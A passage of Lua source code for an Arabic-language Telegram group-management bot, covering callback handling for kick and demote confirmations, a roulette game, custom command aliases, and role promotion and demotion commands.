else 
Abs = "لا يوجد"
end
end
return Abs
end
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({ ID = request_id, chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = input_message_content }, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = { ID = "InputMessageDocument", document_ = getInputFile(document), caption_ = caption } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageVoice", voice_ = getInputFile(voice), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageAudio", audio_ = getInputFile(audio), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = { ID = "InputMessageSticker", sticker_ = getInputFile(sticker), width_ = 0, height_ = 0 } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
function formsgs(msgs) 
local MsgText = ''  
if tonumber(msgs) < 100 then 
MsgText = 'جدا ضعيف' 
elseif tonumber(msgs) < 250 then 
MsgText = 'ضعيف' 
elseif tonumber(msgs) < 500 then 
MsgText = 'غير متفاعل' 
elseif tonumber(msgs) < 750 then 
MsgText = 'متوسط' 
elseif tonumber(msgs) < 1000 then 
MsgText = 'متفاعل' 
elseif tonumber(msgs) < 2000 then 
MsgText = 'قمة التفاعل' 
elseif tonumber(msgs) < 3000 then 
MsgText = 'ملك التفاعل'  
elseif tonumber(msgs) < 4000 then 
MsgText = 'اسطورة التفاعل' 
elseif tonumber(msgs) < 5000 then 
MsgText = 'متفاعل نار' 
elseif tonumber(msgs) < 6000 then 
MsgText = 'يجدح جدح' 
elseif tonumber(msgs) < 7000 then 
MsgText = 'خيالي' 
elseif tonumber(msgs) < 8000 then 
MsgText = 'رب التفاعل' 
elseif tonumber(msgs) < 9000 then 
MsgText = 'كافر بالتفاعل' 
elseif tonumber(msgs) < 10000000000 then 
MsgText = "معلك لربك" 
end 
return MsgText
end
function absmoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevAbs:get(David..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
function ChCheck(msg)
local var = true 
if DevAbs:get(David.."DevAbs2") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevAbs:get(David..'DevAbs2')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevAbs:get(David..'Abs:textch:user') then
local textchuser = DevAbs:get(David..'Abs:textch:user')
send(msg.chat_id_,msg.id_,'['..textchuser..']')
else
send(msg.chat_id_,msg.id_,"⌁︙عليك الاشتراك في قناة البوت \n⌁︙قناة البوت ↫ ["..DevAbs:get(David..'DevAbs3').."]")
end
elseif data.ok then
return var
end
else
return var
end
end
chats = {}
function tdcli_update_callback(data)
if (data.ID == "UpdateNewCallbackQuery") then
local Chat_Id2 = data.chat_id_
local MsgId2 = data.message_id_
local DataText = data.payload_.data_
local Msg_Id2 = data.message_id_/2097152/0.5
if DataText == '/delyes' and DevAbs:get(David..'yes'..data.sender_user_id_) == 'delyes' then
DevAbs:del(David..'yes'..data.sender_user_id_, 'delyes')
DevAbs:del(David..'no'..data.sender_user_id_, 'delno')
if RankChecking(data.sender_user_id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "⌁︙لا استطيع طرد ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=data.chat_id_,user_id_=data.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,da) 
if (da and da.code_ and da.code_ == 400 and da.message_ == "CHAT_ADMIN_REQUIRED") then 
EditMsg(Chat_Id2, Msg_Id2, "⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if (da and da.code_ and da.code_ == 3) then 
EditMsg(Chat_Id2, Msg_Id2, "⌁︙البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
if da and da.code_ and da.code_ == 400 and da.message_ == "USER_ADMIN_INVALID" then 
EditMsg(Chat_Id2, Msg_Id2, "⌁︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
if da and da.ID and da.ID == "Ok" then
ChatKick(data.chat_id_, data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم طردك من المجموعه") 
return false
end
end,nil)  
end
if DataText == '/delno' and DevAbs:get(David..'no'..data.sender_user_id_) == 'delno' then
DevAbs:del(David..'yes'..data.sender_user_id_, 'delyes')
DevAbs:del(David..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء امر اطردني") 
end
if DataText == '/yesdel' and DevAbs:get(David..'yesdel'..data.sender_user_id_) == 'delyes' then
DevAbs:del(David..'yesdel'..data.sender_user_id_, 'delyes')
DevAbs:del(David..'nodel'..data.sender_user_id_, 'delno')
if DevAbs:sismember(David..'Abs:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevAbs:sismember(David..'Abs:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevAbs:sismember(David..'Abs:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevAbs:sismember(David..'Abs:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevAbs:sismember(David..'Abs:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevAbs:sismember(David..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevAbs:sismember(David..'Abs:Constructor:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(David..'Abs:Managers:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(David..'Abs:Admins:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(David..'Abs:VipMem:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(David..'Abs:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(David..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevAbs:srem(David..'Abs:Constructor:'..data.chat_id_,data.sender_user_id_)
DevAbs:srem(David..'Abs:Managers:'..data.chat_id_,data.sender_user_id_)
DevAbs:srem(David..'Abs:Admins:'..data.chat_id_,data.sender_user_id_)
DevAbs:srem(David..'Abs:VipMem:'..data.chat_id_,data.sender_user_id_)
DevAbs:srem(David..'Abs:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevAbs:srem(David..'User:Donky:'..data.chat_id_,data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم تنزيلك من ↫ ⤈\n~ ( "..constructor..''..Managers..''..admins..''..vipmem..''..cleaner..''..donky.." ) ~ \n") 
else 
if IdRank(data.sender_user_id_, data.chat_id_) == 'العضو' then
EditMsg(Chat_Id2, Msg_Id2, "⌁︙ليس لديك رتبه في البوت") 
else 
EditMsg(Chat_Id2, Msg_Id2, "⌁︙لا استطيع تنزيل ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
end
end
end
if DevAbs:get(David.."Abs:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء امر تغير المطور الاساسي") 
DevAbs:del(David.."Abs:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevAbs:get(David.."Abs:NewDev"..data.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = NewDev},function(arg,dp) 
EditMsg(Chat_Id2, Msg_Id2, "⌁︙المطور الجديد ↫ ["..CatchName(dp.first_name_,15).."](tg://user?id="..dp.id_..")\n⌁︙تم تغير المطور الاساسي بنجاح") 
end,nil)
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,dp) 
SendText(NewDev,"⌁︙بواسطة ↫ ["..CatchName(dp.first_name_,15).."](tg://user?id="..dp.id_..")\n⌁︙لقد اصبحت انت مطور هذا البوت",0,'md')
end,nil)
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
Config = {
DevId = NewDev,
TokenBot = TokenBot,
David = TokenBot:match("(%d+)"),
SudoIds = {NewDev},
}
Create(Config, "./config.lua")  
DevAbs:del(David.."Abs:NewDev"..data.sender_user_id_)
dofile('David.lua') 
end
end
if DataText == '/nodel' and DevAbs:get(David..'nodel'..data.sender_user_id_) == 'delno' then
DevAbs:del(David..'yesdel'..data.sender_user_id_, 'delyes')
DevAbs:del(David..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevAbs:get(David.."Abs:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevAbs:smembers(David..'Abs:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevAbs:incrby(David..'Abs:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevAbs:del(David..'Abs:ListRolet'..data.chat_id_) 
DevAbs:del(David.."Abs:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⌁︙*صاحب الحظ* ↫ ["..UserName.."]\n⌁︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevAbs:del(David..'Abs:ListRolet'..data.chat_id_) 
DevAbs:del(David.."Abs:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevAbs:del(David.."Abs:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء اللعبه لاعادة اللعب ارسل الالعاب") 
end
if DataText == '/ListRolet' then
local List = DevAbs:smembers(David..'Abs:ListRolet'..data.chat_id_) 
local Text = '⌁︙قائمة الاعبين ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n' 
local Textt = '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تم اكتمال العدد الكلي هل انت مستعد ؟'
for k, v in pairs(List) do 
Text = Text..k.."~ : [" ..v.."]\n"  
end 
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}}} 
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text..Textt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
text = msg.content_.text_ 
if text and DevAbs:get(David.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevAbs:get(David.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevAbs:del(David.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevAbs:del(David.."Set:Cmd:Group:New"..msg.chat_id_)
DevAbs:srem(David.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الامر من المجموعه", 1, 'html')  
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لايوجد امر بهذا الاسم", 1, 'html')
end
DevAbs:del(David.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevAbs:get(David..'Abs:NameBot') or "ديفد")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevAbs:get(David..'Abs:NameBot') or "ديفد")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevAbs:get(David.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevAbs:get(David.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevAbs:set(David.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر الجديد", 1, 'html')
DevAbs:del(David.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevAbs:set(David.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevAbs:get(David.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevAbs:get(David.."Set:Cmd:Group:New"..msg.chat_id_)
DevAbs:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevAbs:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الامر", 1, 'html')
DevAbs:del(David.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = DevAbs:smembers(David.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "⌁︙قائمة الاوامر المضافه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
Cmds = DevAbs:get(David.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..""..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..""..k.."~ ("..v..") \n"
end
end
if #List == 0 then
t = "⌁︙لاتوجد اوامر مضافه في المجموعه"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if text == "حذف الاوامر المضافه" or text == "حذف الاوامر" or text == "مسح الاوامر المضافه" and ChCheck(msg) then
local List = DevAbs:smembers(David.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevAbs:del(David.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevAbs:del(David.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الاوامر المضافه في المجموعه", 1, 'html')
end
if text == "اضف امر" or text == "اضافة امر" or text == "اضافه امر" and ChCheck(msg) then
DevAbs:set(David.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر القديم", 1, 'html')
return false
end
if text == "حذف امر" or text == "مسح امر" and ChCheck(msg) then 
DevAbs:set(David.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر الذي قمت باضافته يدويا", 1, 'html')
return false
end
end
if text == "الصلاحيات" or text == "صلاحيات" and ChCheck(msg) then 
local List = DevAbs:smembers(David.."Coomds"..msg.chat_id_)
if #List == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد صلاحيات مضافه", 1, 'html')
return false
end
t = "⌁︙قائمة الصلاحيات المضافه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
var = DevAbs:get(David.."Comd:New:rt:Abs:"..v..msg.chat_id_)
if var then
t = t..""..k.."~ "..v.." • ("..var..")\n"
else
t = t..""..k.."~ "..v.."\n"
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if Admin(msg) then
if text == "حذف الصلاحيات" and ChCheck(msg) or text == "مسح الصلاحيات" and ChCheck(msg) then
local List = DevAbs:smembers(David.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevAbs:del(David.."Comd:New:rt:Abs:"..v..msg.chat_id_)
DevAbs:del(David.."Coomds"..msg.chat_id_)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الصلاحيات المضافه", 1, 'html')
end
end
if text and text:match("^اضف صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
DevAbs:set(David.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevAbs:sadd(David.."Coomds"..msg.chat_id_,ComdNew)  
DevAbs:setex(David.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n⌁︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevAbs:del(David.."Comd:New:rt:Abs:"..ComdNew..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الصلاحيه", 1, 'html')
end
if DevAbs:get(David.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر", 1, 'html')
DevAbs:del(David.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not Constructor(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تستطيع اضافة صلاحية ( عضو • مميز  • ادمن )\n⌁︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "ادمن" then
if not Manager(msg) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تستطيع اضافة صلاحية ( عضو • مميز )\n⌁︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مميز" then
if not Admin(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تستطيع اضافة صلاحية ( عضو )\n⌁︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = DevAbs:get(David.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevAbs:set(David.."Comd:New:rt:Abs:"..textn..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم اضافة الصلاحيه", 1, 'html')
DevAbs:del(David.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_ABBAS = text:match("رفع (.*)")
if DevAbs:sismember(David.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrabs = DevAbs:get(David.."Comd:New:rt:Abs:"..DEV_ABBAS..msg.chat_id_)
if mrabs == "مميز" and VipMem(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'X7PX7')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:set(David.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS) 
DevAbs:sadd(David..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "ادمن" and Admin(msg) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'X7PX7')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:set(David.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)
DevAbs:sadd(David..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "مدير" and Manager(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'X7PX7')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:set(David.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)  
DevAbs:sadd(David..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "عضو" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'X7PX7')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_ABBAS = text:match("تنزيل (.*)")
if DevAbs:sismember(David.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrabs = DevAbs:get(David.."Comd:New:rt:Abs:"..DEV_ABBAS..msg.chat_id_)
if mrabs == "مميز" and VipMem(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'X7PX7')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:srem(David..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(David.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "ادمن" and Admin(msg) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'X7PX7')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(David.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "مدير" and Manager(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'X7PX7')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:srem(David..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(David.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "عضو" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'X7PX7')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^رفع (.*) @(.*)") then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if DevAbs:sismember(David.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrabs = DevAbs:get(David.."Comd:New:rt:Abs:"..text1[2]..msg.chat_id_)
if mrabs == "مميز" and VipMem(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'X7PX7')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:sadd(David..'Abs:VipMem:'..msg.chat_id_, result.id_)
DevAbs:set(David.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "ادمن" and Admin(msg) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'X7PX7')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:sadd(David..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:set(David.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "مدير" and Manager(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'X7PX7')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:sadd(David..'Abs:Managers:'..msg.chat_id_, result.id_)
DevAbs:set(David.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "عضو" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'X7PX7')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^تنزيل (.*) @(.*)") then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if DevAbs:sismember(David.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrabs = DevAbs:get(David.."Comd:New:rt:Abs:"..text1[2]..msg.chat_id_)
if mrabs == "مميز" and VipMem(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'X7PX7')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:srem(David..'Abs:VipMem:'..msg.chat_id_, result.id_)
DevAbs:del(David.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "ادمن" and Admin(msg) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'X7PX7')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:del(David.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "مدير" and Manager(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'X7PX7')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:srem(David..'Abs:Managers:'..msg.chat_id_, result.id_)
DevAbs:del(David.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "عضو" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'X7PX7')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙*المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
